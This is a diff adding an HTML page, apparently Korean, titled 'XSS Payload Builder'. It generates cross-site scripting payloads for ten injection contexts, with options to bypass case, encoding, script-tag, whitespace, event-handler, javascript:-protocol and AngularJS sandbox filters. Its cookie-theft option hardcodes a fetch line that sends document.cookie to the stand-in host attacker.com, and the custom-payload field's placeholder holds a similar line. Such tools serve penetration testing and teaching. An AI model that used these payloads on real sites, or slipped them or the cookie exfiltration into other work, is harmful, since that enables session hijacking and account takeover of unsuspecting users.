@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Payload Builder</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { min-height: 100vh; background: #0d1117; color: #e6edf3; font-family: 'Segoe UI', sans-serif; padding: 2rem 1rem; }
+    header { display: flex; align-items: center; gap: 1rem; max-width: 1100px; margin: 0 auto 2rem; }
+    header a { color: #8b949e; text-decoration: none; font-size: 0.9rem; }
+    header a:hover { color: #58a6ff; }
+    h1 { font-size: 1.6rem; color: #58a6ff; }
+    .container { max-width: 1100px; margin: 0 auto; }
+    .grid { display: grid; grid-template-columns: 340px 1fr; gap: 1.5rem; }
+    @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
+    .panel { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; }
+    .panel h2 { font-size: 1rem; color: #8b949e; margin-bottom: 1.2rem; padding-bottom: 0.75rem; border-bottom: 1px solid #30363d; }
+    .form-group { margin-bottom: 1rem; }
+    label { display: block; font-size: 0.8rem; color: #8b949e; margin-bottom: 0.4rem; }
+    select, input[type=text] { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 8px;
+      color: #e6edf3; font-size: 0.9rem; padding: 0.55rem 0.75rem; outline: none; transition: border-color 0.2s; }
+    select:focus, input:focus { border-color: #58a6ff; }
+    .check-group { display: flex; flex-direction: column; gap: 0.4rem; }
+    .check-item { display: flex; align-items: center; gap: 0.5rem; font-size: 0.85rem; cursor: pointer; }
+    .check-item input[type=checkbox] { accent-color: #58a6ff; width: 14px; height: 14px; }
+    button { padding: 0.5rem 1.2rem; border-radius: 8px; border: none; cursor: pointer; font-size: 0.9rem; font-weight: 600; transition: opacity 0.2s; }
+    button:hover { opacity: 0.85; }
+    .btn-gen  { background: #1f6feb; color: #fff; width: 100%; margin-top: 1rem; }
+    .btn-copy { background: #30363d; color: #e6edf3; font-size: 0.8rem; padding: 0.3rem 0.7rem; }
+    .payload-list { display: flex; flex-direction: column; gap: 0.6rem; max-height: calc(100vh - 200px); overflow-y: auto; }
+    .payload-card {
+      background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 0.75rem 1rem;
+      display: flex; flex-direction: column; gap: 0.4rem;
+    }
+    .payload-card:hover { border-color: #58a6ff; }
+    .payload-meta { display: flex; align-items: center; gap: 0.6rem; flex-wrap: wrap; }
+    .payload-code { font-family: 'Courier New', monospace; font-size: 0.82rem; color: #79c0ff; word-break: break-all; }
+    .payload-note { font-size: 0.75rem; color: #8b949e; }
+    .tag { font-size: 0.7rem; padding: 0.15rem 0.5rem; border-radius: 4px; }
+    .tag-bypass { background: #2d1f00; color: #d29922; }
+    .tag-basic  { background: #1a2535; color: #58a6ff; }
+    .tag-ctx    { background: #1a2d1a; color: #3fb950; }
+    .payload-top { display: flex; justify-content: space-between; align-items: flex-start; gap: 0.5rem; }
+    .empty-state { color: #8b949e; text-align: center; padding: 3rem; font-style: italic; }
+    .count-badge { display: inline-block; background: #1f6feb; color: #fff; border-radius: 20px; font-size: 0.75rem; padding: 0.15rem 0.6rem; margin-left: 0.5rem; }
+  </style>
+</head>
+<body>
+  <header>
+    <a href="index.html">← 홈</a>
+    <h1>XSS Payload Builder</h1>
+  </header>
+
+  <div class="container">
+    <div class="grid">
+      <!-- 설정 -->
+      <div class="panel">
+        <h2>컨텍스트 설정</h2>
+
+        <div class="form-group">
+          <label>Injection Context</label>
+          <select id="ctx">
+            <option value="html_body">HTML Body (태그 사이)</option>
+            <option value="html_attr_dq">HTML Attribute (쌍따옴표)</option>
+            <option value="html_attr_sq">HTML Attribute (홑따옴표)</option>
+            <option value="html_attr_unquoted">HTML Attribute (따옴표 없음)</option>
+            <option value="js_string_dq">JS String (쌍따옴표)</option>
+            <option value="js_string_sq">JS String (홑따옴표)</option>
+            <option value="js_template">JS Template Literal (backtick)</option>
+            <option value="url_param">URL Parameter</option>
+            <option value="svg">SVG 컨텍스트</option>
+            <option value="comment">HTML 주석</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>Sink / 목적</label>
+          <select id="sink">
+            <option value="alert">alert(1) — 기본 PoC</option>
+            <option value="cookie">document.cookie 탈취</option>
+            <option value="custom">커스텀 페이로드</option>
+          </select>
+        </div>
+
+        <div class="form-group" id="customGroup" style="display:none">
+          <label>커스텀 JS 페이로드</label>
+          <input type="text" id="customPayload" placeholder="fetch('https://...?c='+document.cookie)">
+        </div>
+
+        <div class="form-group">
+          <label>필터 우회 옵션</label>
+          <div class="check-group">
+            <label class="check-item"><input type="checkbox" id="f_case"> 대소문자 변환 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_encode"> HTML/URL 엔티티 인코딩</label>
+            <label class="check-item"><input type="checkbox" id="f_script"> &lt;script&gt; 태그 차단 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_space"> 공백 필터 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_evt"> on이벤트 속성 필터 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_proto"> javascript: 프로토콜 필터 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_angular"> AngularJS sandbox</label>
+          </div>
+        </div>
+
+        <button class="btn-gen" onclick="generate()">페이로드 생성</button>
+      </div>
+
+      <!-- 결과 -->
+      <div class="panel">
+        <h2>
+          생성된 페이로드
+          <span class="count-badge" id="countBadge">0</span>
+        </h2>
+        <div class="payload-list" id="payloadList">
+          <div class="empty-state">컨텍스트를 선택하고 "페이로드 생성"을 클릭하세요.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('sink').addEventListener('change', function() {
+      document.getElementById('customGroup').style.display = this.value === 'custom' ? 'block' : 'none';
+    });
+
+    function getJS() {
+      const sink = document.getElementById('sink').value;
+      if (sink === 'alert') return 'alert(1)';
+      if (sink === 'cookie') return "fetch('https://attacker.com/?c='+document.cookie)";
+      return document.getElementById('customPayload').value || 'alert(1)';
+    }
+
+    function generate() {
+      const ctx  = document.getElementById('ctx').value;
+      const js   = getJS();
+      const fCase   = document.getElementById('f_case').checked;
+      const fEncode = document.getElementById('f_encode').checked;
+      const fScript = document.getElementById('f_script').checked;
+      const fSpace  = document.getElementById('f_space').checked;
+      const fEvt    = document.getElementById('f_evt').checked;
+      const fProto  = document.getElementById('f_proto').checked;
+      const fAngular= document.getElementById('f_angular').checked;
+
+      const payloads = [];
+
+      const add = (code, note, tags=[]) => payloads.push({ code, note, tags });
+
+      const sp = fSpace ? '/**/' : ' ';
+
+      // Context-specific base payloads
+      if (ctx === 'html_body') {
+        add(`<script>${js}<\/script>`, '기본 script 태그', ['basic']);
+        add(`<img src=x onerror="${js}">`, 'img onerror 이벤트', ['basic']);
+        add(`<svg onload="${js}">`, 'SVG onload', ['basic']);
+        add(`<body onload="${js}">`, 'body onload', ['basic']);
+        add(`<iframe src="javascript:${js}">`, 'iframe javascript: URI', ['basic']);
+        if (fScript) {
+          add(`<ScRiPt>${js}<\/sCrIpT>`, '대소문자 혼합 script', ['bypass']);
+          add(`<img src=x oNeRrOr="${js}">`, '대소문자 혼합 이벤트', ['bypass']);
+          add(`<svg/onload="${js}">`, 'SVG 슬래시 구분자', ['bypass']);
+          add(`<details/open/ontoggle="${js}">`, 'details ontoggle 이벤트', ['bypass']);
+          add(`<input autofocus onfocus="${js}">`, 'input autofocus onfocus', ['bypass']);
+          add(`<select onfocus="${js}" autofocus>`, 'select autofocus', ['bypass']);
+          add(`<video src=1 onerror="${js}">`, 'video onerror', ['bypass']);
+          add(`<math><mtext></math><script>${js}<\/script>`, 'MathML 이후 script', ['bypass']);
+          add(`<table><td><script>${js}<\/script>`, 'table 내부 script', ['bypass']);
+        }
+        if (fEncode) {
+          add(`&#x3C;img src=x onerror=&#x22;${js}&#x22;&#x3E;`, 'HTML hex 엔티티 인코딩', ['bypass', 'encode']);
+          add(`&lt;img src=x onerror=&quot;${js}&quot;&gt;`, 'HTML named 엔티티', ['bypass', 'encode']);
+        }
+        if (fAngular) {
+          add(`{{constructor.constructor('${js}')()}}`, 'AngularJS template injection (v1)', ['bypass', 'angular']);
+          add(`{{$on.constructor('${js}')()}}`, 'AngularJS $on.constructor', ['bypass', 'angular']);
+          add(`<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>`, 'AngularJS ng-csp bypass', ['bypass', 'angular']);
+        }
+      }
+
+      if (ctx === 'html_attr_dq') {
+        add(`"><script>${js}<\/script>`, '따옴표 탈출 후 script 삽입', ['basic']);
+        add(`" onerror="${js}" x="`, 'onerror 삽입', ['basic']);
+        add(`"><img src=x onerror="${js}">`, '태그 닫고 새 태그', ['basic']);
+        add(`"><svg onload="${js}">`, 'SVG 삽입', ['basic']);
+        if (fCase) add(`" OnErRoR="${js}" x="`, '이벤트 대소문자 우회', ['bypass']);
+        if (fSpace) add(`"${sp}onerror="${js}"${sp}x="`, '공백 우회 (주석)', ['bypass']);
+      }
+
+      if (ctx === 'html_attr_sq') {
+        add(`'><script>${js}<\/script>`, '홑따옴표 탈출', ['basic']);
+        add(`' onerror='${js}' x='`, 'onerror 삽입', ['basic']);
+        add(`'><img src=x onerror='${js}'>`, '태그 닫고 삽입', ['basic']);
+        if (fCase) add(`' OnErRoR='${js}' x='`, '이벤트 대소문자 우회', ['bypass']);
+      }
+
+      if (ctx === 'html_attr_unquoted') {
+        add(`x onerror=${js} y=`, '따옴표 없는 속성 탈출', ['basic']);
+        add(`><script>${js}<\/script>`, '태그 닫기 후 script', ['basic']);
+        if (fSpace) add(`x\tonerror=${js}\ty=`, 'Tab 공백 우회', ['bypass']);
+        if (fSpace) add(`x\nonerror=${js}\ny=`, '줄바꿈 공백 우회', ['bypass']);
+      }
+
+      if (ctx === 'js_string_dq') {
+        add(`"-${js}-"`, '따옴표 닫기 후 JS 삽입', ['basic']);
+        add(`";${js};//`, '세미콜론 탈출', ['basic']);
+        add(`\\"-(${js})-\\"`, '이스케이프 슬래시 우회', ['bypass']);
+        if (fEncode) add(`\\u0022;${js};//`, 'Unicode 이스케이프 따옴표', ['bypass', 'encode']);
+        add(`"+${js}+"`, '문자열 연결 삽입', ['basic']);
+      }
+
+      if (ctx === 'js_string_sq') {
+        add(`'-${js}-'`, '홑따옴표 탈출', ['basic']);
+        add(`';${js};//`, '세미콜론 탈출', ['basic']);
+        add(`\\'-${js}-\\'`, '이스케이프 슬래시 우회', ['bypass']);
+        if (fEncode) add(`\\u0027;${js};//`, 'Unicode 이스케이프 따옴표', ['bypass', 'encode']);
+      }
+
+      if (ctx === 'js_template') {
+        add(`\`-${js}-\``, '백틱 탈출', ['basic']);
+        add(`\${${js}}`, '템플릿 표현식 직접 삽입', ['basic']);
+        add(`\`;\`+${js}//`, '세미콜론 탈출', ['basic']);
+      }
+
+      if (ctx === 'url_param') {
+        add(`javascript:${js}`, 'javascript: 프로토콜 (href/src)', ['basic']);
+        add(`data:text/html,<script>${js}<\/script>`, 'data: URI (src 속성)', ['basic']);
+        if (fProto) {
+          add(`JaVaScRiPt:${js}`, 'javascript: 대소문자 우회', ['bypass']);
+          add(`javascript\t:${js}`, 'Tab 삽입 우회', ['bypass']);
+          add(`javascript:/*\n*/${js}`, '줄바꿈 삽입 우회', ['bypass']);
+          add(`javas&#x63;ript:${js}`, '엔티티 인코딩 우회', ['bypass', 'encode']);
+          add(`%6Aavascript:${js}`, 'URL 인코딩 우회', ['bypass', 'encode']);
+        }
+      }
+
+      if (ctx === 'svg') {
+        add(`<svg onload="${js}">`, 'SVG onload', ['basic', 'ctx']);
+        add(`<svg><script>${js}<\/script></svg>`, 'SVG 내 script', ['basic', 'ctx']);
+        add(`<svg><animate onbegin="${js}" attributeName=x dur=1s>`, 'animate onbegin', ['basic', 'ctx']);
+        add(`<svg><set onbegin="${js}">`, 'set onbegin', ['basic', 'ctx']);
+        add(`<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>${js}<\/script></svg>#x">`, 'SVG use href data:', ['bypass', 'ctx']);
+        if (fCase) add(`<SVG ONLOAD="${js}">`, '대문자 SVG/ONLOAD', ['bypass', 'ctx']);
+      }
+
+      if (ctx === 'comment') {
+        add(`--><script>${js}<\/script><!--`, '주석 탈출 후 script', ['basic']);
+        add(`--><img src=x onerror="${js}"><!--`, '주석 탈출 후 img', ['basic']);
+        add(`--!><script>${js}<\/script><!--`, '--!> 방식 주석 탈출', ['bypass']);
+      }
+
+      // 이벤트 필터 우회 공통 추가
+      if (fEvt && (ctx === 'html_body' || ctx === 'html_attr_dq' || ctx === 'html_attr_sq')) {
+        add(`<video><source onerror="${js}">`, 'source onerror', ['bypass']);
+        add(`<audio src=x onerror="${js}">`, 'audio onerror', ['bypass']);
+        add(`<body onpageshow="${js}">`, 'body onpageshow', ['bypass']);
+        add(`<marquee onstart="${js}">`, 'marquee onstart', ['bypass']);
+        add(`<isindex type=image src=1 onerror="${js}">`, 'isindex onerror (IE)', ['bypass']);
+        add(`<object data="javascript:${js}">`, 'object data javascript:', ['bypass']);
+        add(`<form><button formaction="javascript:${js}">click</button></form>`, 'button formaction', ['bypass']);
+      }
+
+      // 렌더링
+      const list = document.getElementById('payloadList');
+      document.getElementById('countBadge').textContent = payloads.length;
+
+      if (payloads.length === 0) {
+        list.innerHTML = '<div class="empty-state">해당 설정으로 생성된 페이로드가 없습니다.</div>';
+        return;
+      }
+
+      list.innerHTML = payloads.map((p, i) => `
+        <div class="payload-card">
+          <div class="payload-top">
+            <div class="payload-meta">
+              ${p.tags.map(t => `<span class="tag tag-${t === 'bypass' || t === 'encode' || t === 'angular' ? 'bypass' : t === 'ctx' ? 'ctx' : 'basic'}">${t}</span>`).join('')}
+            </div>
+            <button class="btn-copy" onclick="copyPayload(${i})">Copy</button>
+          </div>
+          <div class="payload-code">${escHtml(p.code)}</div>
+          <div class="payload-note">${p.note}</div>
+        </div>
+      `).join('');
+
+      window._payloads = payloads;
+    }
+
+    function copyPayload(i) {
+      navigator.clipboard.writeText(window._payloads[i].code).then(() => {
+        showToast();
+      });
+    }
+
+    function escHtml(s) {
+      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+
+    function showToast() {
+      let t = document.getElementById('toast');
+      if (!t) {
+        t = document.createElement('div');
+        t.id = 'toast';
+        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;background:#238636;color:#fff;padding:.6rem 1.2rem;border-radius:8px;font-size:.85rem;opacity:0;transition:opacity .3s;pointer-events:none';
+        t.textContent = '복사 완료!';
+        document.body.appendChild(t);
+      }
+      t.style.opacity = '1';
+      setTimeout(() => { t.style.opacity = '0'; }, 1500);
+    }
+  </script>
+</body>
+</html>
